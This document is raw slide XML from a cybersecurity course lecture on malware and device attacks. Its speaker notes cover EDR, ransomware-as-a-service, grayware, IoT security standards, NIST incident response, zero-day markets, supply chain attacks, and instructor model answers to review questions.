              <a:t>The automated response capabilities of modern EDR platforms have substantially reduced the mean time to contain (MTTC) malware incidents. When a high-confidence behavioral detection fires (for example, a process matching ransomware's file-encryption behavior pattern), the EDR can automatically isolate the endpoint from the network within seconds, cutting off C2 communications and preventing lateral movement, while triggering forensic evidence collection and notifying the SOC. SentinelOne's Storyline feature extends this with automated rollback: because the EDR tracks every file modification, it can automatically restore files that the ransomware encrypted by leveraging Windows Volume Shadow Service (VSS) snapshots, effectively reversing the ransomware's impact without requiring backups.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>NIST SP 800-53 SI-4 (System Monitoring) explicitly calls for the deployment of monitoring tools that detect malicious activity at the endpoint level, and EDR platforms represent the primary technical control satisfying this requirement in modern security architectures.</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Ransomware-as-a-Service model represents the industrialization of ransomware, transforming what was once a capability requiring sophisticated malware development skills into a commodity service available to relatively low-skill criminal actors. Just as legitimate Software-as-a-Service companies provide ready-built software platforms to business customers, RaaS organizations provide ready-built ransomware platforms to "affiliate" operators, individuals or criminal groups who use the platform to attack victims but do not possess the technical capability to develop ransomware themselves.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>The RaaS business model emerged clearly around 2018–2019, pioneered by groups like GandCrab (which claimed revenues of over $2 billion before announcing its "retirement" in 2019) and subsequently operationalized at industrial scale by LockBit, BlackCat/ALPHV, Cl0p, Hive, and dozens of other groups. The developer organization provides a comprehensive platform that typically includes: a highly optimized ransomware binary that affiliates can customize with their contact email, ransom amount, and file extension; a Tor-based victim negotiation portal where victims make contact and payment; an automated cryptocurrency payment processing system; a "leak site" (data extortion blog) where stolen victim data is published if payment is refused; and 24/7 technical support for victims attempting to decrypt their files after payment.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>The revenue-sharing arrangement varies by group but typically provides 70–80% of each ransom payment to the affiliate who conducted the attack, with 20–30% retained by the RaaS developer. This structure incentivizes affiliates to attack high-value targets (hospitals, law firms, manufacturing companies, financial institutions) that can pay large ransoms, and to spend time in victim networks prior to deploying ransomware to maximize damage, a "big game hunting" strategy. The average dwell time of ransomware operators in victim networks before deploying the encryptor has increased from days to weeks, during which they perform reconnaissance, steal data for double extortion, disable backup systems, and gain domain administrator privileges to maximize the impact of the eventual encryption.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>LockBit, arguably the most successful RaaS operation ever documented, built a sophisticated affiliate recruitment and management process including a structured "bug bounty" program (offering cryptocurrency rewards to security researchers who found bugs in their own platform) and a review system where affiliates could rate their experience with the developer team. LockBit was attributed responsibility for more documented ransomware incidents than any other group in 2022 and 2023 before Operation Cronos, a coordinated law enforcement action in February 2024, disrupted their infrastructure and led to the arrest and prosecution of several key members.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>The RaaS ecosystem has also created a secondary economy of "initial access brokers", criminal specialists who compromise networks through phishing, credential stuffing, or exploitation of public-facing vulnerabilities, then sell authenticated access to compromised networks (RDP credentials, VPN accounts, active directory footholds) on darknet markets to ransomware affiliates who lack the skills to achieve initial access themselves. This specialization and division of labor has made the overall ransomware threat more resilient to law enforcement disruption, since no single actor possesses the complete attack chain.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>Defending against RaaS attacks requires addressing the complete attack chain, not just the final ransomware deployment. CISA and the Multi-State Information Sharing and Analysis Center (MS-ISAC) recommend: disabling RDP if not required (or enforcing it through VPN with MFA), rapid patching of internet-facing systems, phishing-resistant MFA on all remote access, network segmentation to prevent lateral movement, and immutable offline backups. The FBI and CISA joint advisory AA23-061A provides a comprehensive list of technical controls specifically effective against the most active RaaS groups.</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binary classification of software as either "legitimate" or "malicious" is a useful pedagogical starting point, but the real world of unwanted software is considerably more nuanced. A large category of software causes measurable harm to users, slowing their systems, tracking their behavior, generating unwanted advertisements, or consuming their resources, while maintaining a veneer of legitimacy through consent mechanisms that are buried in page 47 of a 60-page end-user license agreement (EULA) in 8-point font. This category is collectively known as grayware, and understanding it matters because it represents the most common category of software that users actually encounter, and because grayware installations frequently serve as the delivery mechanism for more serious malware.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>Adware is perhaps the most historically significant grayware category. The Superfish incident (2014) illustrates its potential for serious harm. Lenovo pre-installed Superfish VisualDiscovery on consumer laptops, a program that analyzed users' web browsing to display advertisements alongside search results. To accomplish this, Superfish installed its own self-signed root certificate authority into the Windows certificate store, allowing it to perform HTTPS interception (a man-in-the-middle attack against TLS connections) to inject ads into encrypted web sessions. The critical security flaw: Superfish's root certificate used the same private key across all installed copies, and researchers extracted this key from one laptop and published it. This meant any attacker could use Superfish's trusted certificate to conduct HTTPS interception against any Superfish-affected Lenovo laptop on any network, a devastating privacy and security failure that forced Lenovo to issue emergency removal tools and an apology.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>The Fireball case (2017) demonstrates adware's potential scale. Rafotech, a Chinese digital marketing company, distributed a browser hijacker through software bundling that installed in over 250 million computers worldwide (including 20 million in the United States), redirecting browsers to the attacker's search portals and generating significant advertising revenue. Crucially, Fireball's C2 infrastructure had the capability to push additional malware payloads to all 250 million infected systems, effectively making it the largest malware distribution platform in the world at that time. The distinction between adware and a fully weaponized malware infrastructure was only one C2 command away.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>Stalkerware represents a particularly ethically complex category. Marketed using terms like "parental monitoring apps" or "employee productivity tracking," these commercial applications are functionally identical to spyware: they hide on the target device, record all communications, track GPS location, capture photos, and send all data to a web portal accessible by the installer. Unlike traditional spyware, stalkerware is sold commercially, sometimes with nominal consent disclosures. The Coalition Against Stalkerware (a nonprofit including security vendors like Kaspersky, ESET, and Malwarebytes) has pushed for antivirus vendors to flag stalkerware using the same detection mechanisms as traditional spyware, which several major vendors have implemented.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>Cryptojacking emerged as a significant grayware category with the cryptocurrency boom of 2017–2018. Rather than encrypting files or stealing data, cryptojacking malware covertly uses the victim's CPU or GPU to perform cryptocurrency mining computations, converting the victim's electricity and hardware wear into cryptocurrency for the attacker. Browser-based cryptojacking using the JavaScript Coinhive library infected thousands of legitimate websites; system-level cryptojackers like XMRig (configured for unauthorized use) were distributed through malware droppers. Detection relies on monitoring for sustained high CPU utilization from unexpected processes, which can be accomplished through endpoint monitoring tools or cloud workload protection platforms for server infrastructure.</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consequential aspects of security education is directly confronting the myths and misconceptions that lead well-intentioned users and even experienced IT professionals to make poor security decisions. These misconceptions are not random, they are shaped by outdated mental models, misleading vendor marketing, and media coverage that oversimplifies complex technical realities. Each misconception below represents a failure mode that real organizations have experienced with real financial and operational consequences.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>The "I'll know if I'm infected" myth is arguably the most dangerous, because it creates a false sense of security that prevents proactive monitoring. This myth originated in the era of early malware like the Elk Cloner virus (1982) and the CIH virus (1998), which deliberately announced their presence through visible effects, popup messages, destroyed files, system crashes. Modern malware, particularly APT-grade implants and commercial spyware, is engineered with the opposite objective: complete invisibility. Successful APT operations are measured in months and years of undetected access. The Solarwinds compromise (2020), in which Russian SVR's Cozy Bear maintained access to over 100 U.S. federal agencies and Fortune 500 companies for more than nine months before detection, is the definitive refutation of this myth. Organizations must not rely on user observation, continuous automated monitoring is the only reliable detection mechanism.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>The antivirus sufficiency myth has been exploited by attackers for decades. A 2022 study by AV-Comparatives found that modern antivirus tools achieved 98–99% detection rates against known malware families, an impressive figure that still means 1–2% of known threats evade detection, and provides no protection against novel malware variants created daily. The AV-TEST Institute reports that over 450,000 new malware variants are registered every day; by definition, every new variant has zero detection coverage at the moment of its creation. Polymorphic and fileless malware specifically designed to evade signature detection compounds this problem dramatically. AV remains a necessary baseline control, it catches the vast majority of commodity malware, but must be supplemented by behavioral detection (EDR), network monitoring, and the full suite of NIST SP 800-53 protective controls.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>The "Macs don't get malware" myth has real operational consequences: many macOS users do not run any endpoint security software on the belief that their platform is inherently safe. This creates an expanding unprotected attack surface as Mac adoption grows in enterprise environments. The Silver Sparrow malware (2021) infected approximately 30,000 Macs in over 150 countries and was specifically compiled to run on Apple Silicon (M1) processors, demonstrating that malware developers are actively targeting macOS at a professional level. The XCSSET malware targets macOS developers through infected Xcode projects, enabling supply chain attacks. macOS has meaningful security mitigations (Gatekeeper, SIP, notarization requirements) that raise the bar for malware, but these are not absolute barriers, they are controls that sophisticated malware has demonstrated the ability to circumvent.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>The zero-click vulnerability class definitively refutes the "don't click suspicious things" myth. Pegasus (CVE-2021-30860), Chrome's FORCEDENTRY-equivalent renderer exploits, and numerous network-level vulnerabilities demonstrate that a user can be fully compromised without interacting with any suspicious content whatsoever. Supply chain attacks, compromising legitimate software update mechanisms (as in the SolarWinds Orion compromise, CVE-2020-10148), deliver malware through the trusted software update channels that users are explicitly instructed to use.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>Guided correction of malware myths, stating the misconception and then the technical reality, produces more durable attitude change than passive presentation, consistent with NIST SP 800-50 guidance on awareness training effectiveness.</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IoT security standards landscape has evolved rapidly since the Mirai botnet attack demonstrated in 2016 that insecure consumer IoT devices posed a risk not just to their owners but to global internet infrastructure. Prior to Mirai, IoT security was largely addressed through voluntary best practice guidance. The scale and impact of the Mirai DDoS attacks catalyzed regulatory action in multiple jurisdictions, producing a set of increasingly prescriptive and legally binding requirements.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>NIST Internal Report 8259A, "IoT Device Cybersecurity Capability Core Baseline," published in May 2020, defines six fundamental security capabilities that every IoT device should provide. Device identification requires that each device has a unique logical identifier. Device configuration requires that all device configurations, including security settings, can be changed by authorized users. Data protection requires protection of device data at rest and in transit using appropriate cryptography. Logical access to interfaces requires that all device interfaces (network, local, API) are protected by authentication and authorization. Software update requires a mechanism for securely distributing and applying firmware updates. Cybersecurity event logging requires that devices can log security-relevant events.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>NIST SP 800-213, "IoT Device Cybersecurity Guidance for the Federal Government," translates the NIST IR 8259A baseline into specific federal procurement requirements. Federal agencies purchasing IoT devices are required to assess whether prospective devices meet the 8259A baseline and to document their risk acceptance when devices fall short. This creates market pressure on IoT manufacturers who want to sell to the U.S. federal government to incorporate these baseline capabilities.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>The European Telecommunications Standards Institute (ETSI) published EN 303 645, the "Cyber Security for Consumer Internet of Things: Baseline Requirements," in June 2020. This standard represents the most widely adopted international consumer IoT security baseline, with 13 provisions covering areas including the absolute prohibition of universal default passwords (each device must have a unique password or force the user to set one during setup), a vulnerability disclosure policy, keeping software updated through a published support period, secure communications using TLS, minimizing exposed attack surfaces, ensuring software integrity, and protecting personal data. The UK incorporated EN 303 645 into the UK Product Security and Telecommunications Infrastructure (PSTI) Act 2022, making compliance legally mandatory for consumer IoT products sold in the UK.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>The EU Cyber Resilience Act (CRA), which entered force in December 2024 with a phased compliance timeline, represents the most ambitious IoT security regulation to date. The CRA applies to any "product with digital elements" sold in the EU, encompassing virtually all IoT devices, as well as software products. Manufacturers are required to assess cybersecurity risks during design, implement security-by-design principles, publish a Software Bill of Materials (SBOM) listing all software components, maintain a vulnerability disclosure program, provide security updates for the expected product lifetime (minimum 5 years), and report actively exploited vulnerabilities to ENISA (the EU cybersecurity agency) within 24 hours of discovery. Non-compliance can result in market bans and fines of up to €15 million or 2.5% of global annual turnover.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>The convergence of these standards around a common set of principles, unique credentials, secure updates, encrypted communications, minimal attack surfaces, and vulnerability disclosure, reflects industry consensus on the minimum viable IoT security baseline. The shift from voluntary guidance (NIST IR 8259A) to binding regulation (EU CRA, UK PSTI) reflects growing recognition that market forces alone have been insufficient to drive security investment in the IoT manufacturing sector.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>The IoT security problem is economic: manufacturers compete mainly on production cost, and security adds cost without being visible to buyers. Regulation that sets a minimum security floor for all competitors at once removes the competitive disadvantage of implementing security, which is why regulatory approaches have become necessary.</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well-executed malware incident response can limit organizational damage to a contained event affecting a small number of systems; a poor response can allow a single compromised endpoint to become a network-wide catastrophe. The NIST SP 800-61 Rev. 2 Computer Security Incident Handling Guide provides the foundational framework that most enterprise incident response programs follow, defining the four-phase lifecycle that shapes organizational response to any security incident, with significant malware-specific procedures applied at each phase.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>The Preparation phase is the most important investment, because it determines the capability available to responders during an actual incident. Preparation includes establishing an incident response team (IRT) with clearly defined roles (incident commander, forensic analyst, communications lead, business liaison), deploying the technical tooling (EDR, SIEM, forensic imaging workstations, malware analysis sandbox), creating and maintaining incident response playbooks for the most likely malware scenarios (ransomware playbook, RAT/APT playbook, worm containment playbook), and regularly testing these playbooks through tabletop exercises and red team engagements. Organizations that conduct quarterly tabletop exercises consistently demonstrate lower recovery times and lower financial impact when real incidents occur.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>Detection and Analysis begins with the alert, which may come from an EDR behavioral detection, a SIEM correlation rule, a user reporting suspicious behavior, or a threat intelligence feed indicating that infrastructure associated with a known malware campaign has been observed communicating with the organization's systems. The first priority is scoping: determining how many systems are affected, whether the infection is actively spreading, and what malware class is involved. Identifying "patient zero", the initial infection point, is critical for determining how the malware entered the environment and what other systems it may have had contact with during the dwell period.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>Containment decisions require balancing the need to stop the spread against the need to preserve forensic evidence and maintain business continuity. For ransomware actively encrypting files, immediate isolation is paramount, every additional minute of network connectivity allows the malware to encrypt more files and potentially spread to more systems. EDR platforms enable single-click network isolation that cuts the endpoint's network access while maintaining the EDR communication channel (which typically uses a separate resilient connection), allowing analysts to continue forensic investigation on the isolated system. For stealthy APT implants where the attacker has long-term access, immediate isolation may alert the attacker to change tactics or destroy evidence; in these cases, covert observation may be preferable while planning a coordinated simultaneous takedown.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>Forensic evidence preservation must occur before any remediation actions. Memory forensics (capturing a live RAM dump of the infected system using tools like Magnet AXIOM or Volatility) preserves data that exists only in volatile memory, running processes, decrypted malware payloads, network connection state, cryptographic keys. For ransomware, memory forensics sometimes recovers the plaintext encryption key before it is zeroed from memory, enabling decryption without paying the ransom. Disk images preserve the file system state including deleted files and malware artifacts that eradication procedures would destroy. Chain-of-custody documentation ensures forensic evidence is admissible if criminal prosecution follows.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>The Post-Incident Activity phase is where organizational learning occurs. A structured after-action review identifies the root cause (which control failed, which vulnerability was exploited, which process was insufficient), the impact timeline, and the lessons that should improve future preparation. New IOCs from the incident (malware hashes, C2 domains, registry persistence keys) are shared with ISACs (Information Sharing and Analysis Centers) and threat intelligence platforms using the STIX format, helping other organizations detect the same threat. NIST SP 800-61 emphasizes that each incident should result in measurable improvements to the organization's incident response capabilities, translating a security failure into an organizational learning opportunity.</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knowledge checkpoint is designed to consolidate understanding before the lecture moves into advanced topics. Effective security professionals must be able to apply conceptual knowledge to realistic scenarios under time pressure, the ability to name definitions is necessary but insufficient. These questions test applied understanding.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>Model answers for instructor reference:</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>Answer to Q1: The most effective preventive control would have been NIST SP 800-53 SI-2 (Flaw Remediation), specifically, applying Microsoft patch MS17-010 within the 59-day window before WannaCry launched. Organizations that applied the patch were not affected. To limit lateral spread after one host is compromised, NIST SP 800-53 SC-7 (Boundary Protection) through network segmentation, specifically, micro-segmentation that limits SMB (TCP 445) traffic to only the systems that legitimately need file sharing, would have dramatically contained the blast radius. WannaCry spread so widely partly because flat network architectures allowed any host to reach any other host on TCP 445.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>Answer to Q2: RSA-2048 encryption of file data is computationally infeasible at scale. RSA can only encrypt data blocks smaller than its key size (approximately 245 bytes for 2048-bit RSA) and is orders of magnitude slower than symmetric algorithms. Encrypting a 5 GB database file with RSA would take hours. If ransomware used RSA for all file encryption, the user would notice dramatic system slowdown, have time to kill the process, and the encryption might not complete before intervention. The hybrid model (AES for speed, RSA to protect the AES key) achieves both speed (completing encryption in seconds before detection) and key security (making recovery without the RSA private key mathematically impossible).</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>Answer to Q3: A metamorphic virus rewrites its functional code body with every replication using semantic-preserving transformations. No two copies share any stable byte sequence that a signature scanner could match. However, the virus must still perform its functional operations at runtime, infecting files, spreading, executing its payload, and these runtime behaviors are observable regardless of what the underlying bytes look like. Behavioral analysis (running the sample in a sandbox and observing: "does it open other executable files and modify them? Does it scan the filesystem for other binaries?") detects the virus's behavior rather than its appearance, making it effective against any metamorphic variant regardless of how the code has been transformed.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>Answer to Q4: Spyware is the most likely culprit, covert access to financial documents without disrupting normal operation is characteristic of data-exfiltration spyware rather than ransomware (which would be immediately obvious) or a worm (which would generate network noise). First investigation step: check outbound network connection logs from the affected system, specifically looking for unusual HTTPS connections to unfamiliar IPs or anomalous DNS query patterns that might indicate DNS tunneling exfiltration. Also check for processes with active keyboard hooks or DLL injection into browser processes using EDR telemetry.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>Answer to Q5: This is almost certainly a Mirai-variant botnet infection, the behavior of scanning random IP addresses on Telnet port intervals is the signature scanning loop of Mirai. Immediate containment: isolate the camera on a separate VLAN with no internet access (to stop the scanning traffic from reaching external targets), change the device credentials immediately, check for firmware updates, and investigate other IoT devices on the same network for similar behavior. Long-term: implement network-level controls that prevent IoT devices from initiating outbound connections to the public internet, routing all IoT traffic through an inspection proxy.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>Answer to Q6: winword.exe spawning powershell.exe is MITRE ATT&amp;CK T1059.001 (Command and Scripting Interpreter: PowerShell). The base64-encoded command is T1027.010 (Obfuscated Files or Information: Command Obfuscation). The outbound HTTPS connection from PowerShell is T1071.001 (Application Layer Protocol: Web Protocols) for C2 communication. The parent-child process chain from a document-processing application is also consistent with T1566.001 (Phishing: Spearphishing Attachment) as the initial access technique. This complete activity chain in an EDR alert would be a high-confidence indicator of a Trojan or RAT delivery through a malicious macro-enabled Office document.</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term "zero-day" captures a brutal asymmetry in cybersecurity: the attacker knows about the vulnerability and can exploit it, while the defender, including the software vendor, has zero days of warning and zero ability to produce a patch. Zero-day vulnerabilities are the most prized assets in offensive cyber operations because they guarantee maximum effectiveness: every target running the vulnerable software is susceptible, signature-based defenses have no pattern to match, and no patch exists to close the door.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>The discovery of zero-day vulnerabilities can occur through multiple channels. Security researchers employed by companies like Google Project Zero, Trend Micro Zero Day Initiative, or academic institutions systematically audit widely deployed software looking for undisclosed vulnerabilities, then responsibly disclose them to vendors following a 90-day disclosure deadline (Google's standard) that gives vendors time to develop and release patches. Independent researchers discover vulnerabilities and sell them to bug bounty programs, receiving rewards that have scaled dramatically, Google pays up to $250,000 for certain Chrome browser vulnerabilities, Apple's Security Research Device Program offers up to $2 million for iOS zero-click exploits. Criminal actors discover vulnerabilities through their own research or purchase them from other researchers, integrating them into exploit kits (Angler, RIG, Nuclear) that make zero-day exploitation accessible to less technically sophisticated criminal actors.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>The commercial zero-day market exists in a legal gray zone. Companies like Zerodium openly purchase "premium zero-day exploits and cybersecurity research" and publish a price list: $2.5 million for an iOS zero-click, full-chain exploit; $2.5 million for an Android zero-click; $1 million for Windows LPE (local privilege escalation) exploits. Zerodium states it sells these exploits exclusively to government customers for "lawful" offensive operations. The Vulnerabilities Equities Process (VEP), an interagency U.S. government policy process, governs decisions about whether to disclose discovered vulnerabilities to vendors for patching or to retain them for intelligence operations.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>From a defensive standpoint, zero-day exploits fundamentally challenge patch management as a primary defense strategy. If no patch exists, patch management cannot close the vulnerability. This is why complementary controls, defense-in-depth architecture, behavioral detection, memory protection technologies (ASLR, DEP/NX, CFI), and network-based anomaly detection, are essential. These controls do not prevent zero-day exploitation but can detect and limit its impact. For example, while EternalBlue exploited a zero-day in SMBv1 (before MS17-010 was released), network-level controls that blocked inbound SMB from the internet would have significantly limited Mirai-era variants from reaching vulnerable systems. Exploit mitigations like Address Space Layout Randomization (ASLR), Data Execution Prevention (DEP), and Control Flow Integrity (CFI) force exploit developers to chain multiple vulnerabilities to achieve reliable code execution, raising the cost and complexity of each attack.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>NIST SP 800-53 RA-5 (Vulnerability Monitoring and Scanning) and SI-2 (Flaw Remediation) both acknowledge that zero-days cannot be patched before discovery but recommend compensating controls. CISA's Known Exploited Vulnerabilities (KEV) catalog tracks vulnerabilities being actively exploited in the wild, mandating federal agencies to patch KEV entries within specified timeframes, typically 14 days for critical and high-severity flaws. The CVSS (Common Vulnerability Scoring System) framework provides a standardized severity score (0.0–10.0) for each CVE, which organizations use to prioritize patching order when multiple vulnerabilities compete for remediation resources.</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Supply chain attacks represent one of the most strategically sophisticated attack categories because they invert the fundamental assumption of security architecture: that software obtained from a trusted vendor through official channels is safe. Every organization that patches its software and keeps systems updated is, in fact, depending on the integrity of its software vendors' build and distribution processes. Supply chain attacks exploit this dependency by compromising the vendor rather than the individual customers, achieving mass access through a single point of compromise.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>The SolarWinds Orion supply chain attack (2020), attributed by the U.S. government to Russia's SVR (Foreign Intelligence Service) and specifically the Cozy Bear / APT29 threat actor, is the defining modern example. SolarWinds Orion is an IT network monitoring platform used by approximately 33,000 organizations globally, including 18,000 who installed a trojanized update. The attackers compromised SolarWinds' build environment in approximately October 2019 and inserted a sophisticated backdoor called SUNBURST into the legitimate SolarWinds Orion software compilation process. The malicious code was compiled alongside legitimate SolarWinds code, digitally signed with SolarWinds' code-signing certificate (making it cryptographically indistinguishable from genuine SolarWinds software), and distributed to customers through the official SolarWinds software update mechanism, the same mechanism customers were instructed to use to stay secure.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>The SUNBURST backdoor was extraordinarily sophisticated in its evasion design. After installation, it remained completely dormant for 12–14 days, making sandboxed analysis of the update package appear entirely benign. After the dormancy period, it performed extensive environmental checks to verify it was not running in a sandbox or on a domain that sounded like a security research environment. If all checks passed, it began communicating with attacker-controlled C2 infrastructure using DNS queries formatted to mimic legitimate SolarWinds telemetry traffic. The attacker maintained access to over 100 U.S. federal agencies, including the Departments of Treasury, Commerce, Homeland Security, and parts of the NSC, for approximately nine months before FireEye discovered the compromise when SUNBURST was detected on their own network.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>The NotPetya attack (2017), attributed to Russia's GRU, used a different supply chain vector: compromising the update server for M.E.Doc, a Ukrainian tax accounting software mandatory for companies doing business in Ukraine. The trojanized update was distributed to M.E.Doc's 400,000 customers, initially within Ukraine. However, NotPetya's worm component then spread beyond Ukraine to the global networks of any multinational company with Ukrainian operations. Shipping giant Maersk lost an estimated $300 million, FedEx subsidiary TNT lost $400 million, pharmaceutical company Merck lost $870 million, and construction company Saint-Gobain lost $384 million, despite none of these companies being the intended target. NotPetya has been called the most destructive and costly cyberattack in history, with total damages estimated between $10–15 billion.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>Defenses against supply chain attacks are significantly more challenging than direct malware defenses because the initial delivery is indistinguishable from legitimate software updates. Key controls include software composition analysis (SBOM, Software Bill of Materials, mandated by U.S. Executive Order 14028 for federal software suppliers) to identify all third-party components in delivered software; build environment security (isolating build systems from internet access, enforcing code signing with hardware security modules, maintaining audit logs of all build events); behavioral monitoring of software post-update installation to detect newly introduced anomalous behaviors; and network monitoring to detect anomalous outbound connections from software that should not be initiating external communications.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>SolarWinds exposes a basic problem in software security: the security of every line of code in every installed package cannot be verified, so vendor integrity becomes an implicit trust anchor. The Software Bill of Materials mandate (NIST SP 800-218, Executive Order 14028) addresses this by making the software supply chain auditable rather than opaque.</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consolidation slide serves as a structured study aid and reference for the core concepts covered across Class 16. The table format is intentional, assessment questions frequently require recall of specific relationships (which standard governs IoT baseline requirements? which NIST control addresses ransomware recovery?), and organizing this information in a consistent tabular structure facilitates efficient review.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>The most common assessment errors on malware taxonomy questions involve confusing propagation vectors, specifically, conflating viruses (which require a host file AND human execution) with worms (which require neither, spreading autonomously through network exploits). A useful mnemonic: a virus needs a Host and a Human to travel; a Worm Wanders on its own. These distinctions matter not just for assessments but for defensive decision-making: the control that prevents virus infection (blocking email attachments, restricting USB access) is entirely ineffective against a worm exploiting a network vulnerability.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>The hybrid cryptography model used by ransomware appears consistently in assessment questions because it illustrates a fundamental cryptographic principle: the tradeoff between key security (asymmetric) and encryption speed (symmetric). The three-sentence summary: ransomware generates a random AES key, uses AES to encrypt all files (fast), then encrypts the AES key with the attacker's RSA public key (secure). Without the RSA private key, the AES key cannot be recovered, and without the AES key, the files cannot be decrypted. The immutable backup (CP-9) is the only effective recovery control.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>The MITRE ATT&amp;CK technique IDs in this table are selected to be the most frequently referenced in threat intelligence reports and detection engineering contexts. Familiarity with T1055 (Process Injection), T1059 (Command and Scripting Interpreter), T1027 (Obfuscated Files), T1486 (Data Encrypted for Impact), and T1056 (Input Capture) provides a working vocabulary for understanding the vast majority of published malware analysis reports. The full ATT&amp;CK matrix is available at https://attack.mitre.org/ and should be bookmarked as a professional reference resource.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>For the standards references: NIST SP 800-83 Rev. 1 is the foundational malware incident handling guide; NIST SP 800-53 Rev. 5 provides the control catalog from which specific defensive controls are drawn; NIST IR 8259A is the IoT device security baseline; NIST SP 800-61 Rev. 2 covers incident response. These four documents, together with MITRE ATT&amp;CK, constitute the core reference framework for Class 16 topics. OWASP IoT Top 10 (2018) and the EU Cyber Resilience Act are the primary IoT-specific references.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>Looking ahead to Class 17, the device hardening session will build directly on today's malware taxonomy. Understanding how viruses modify host executables motivates application whitelisting as a hardening control. Understanding how worms exploit network service vulnerabilities motivates disabling unnecessary services (the attack surface reduction principle). Understanding how Trojans establish persistence through registry run keys and scheduled tasks motivates auditing and restricting these persistence mechanisms as part of the hardening baseline. Malware mechanics and device hardening are complementary, the malware taxonomy defines the attack surface, and the hardening checklist systematically closes it.</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Malware &amp; Device Attacks</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16</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Host-Level Threats, Malicious Payloads, and Evasion Mechanics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Taxonomy of Malicious Software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Malware</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> (malicious software) is defined by NIST SP 800-83 Rev. 1 as a program or file that is inserted into a system, usually covertly, with the intent of compromising the confidentiality, integrity, or availability of the victim's data, applications, or operating system.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Rounded Rectangle 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="280556" y="2093369"/>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Taxonomical Parameters</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Rectangle 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="340556" y="2493369"/>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Propagation Vector:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> The transport mechanism used to replicate and move between systems (e.g., file insertion, network sockets, physical media).</a:t>
            </a:r>
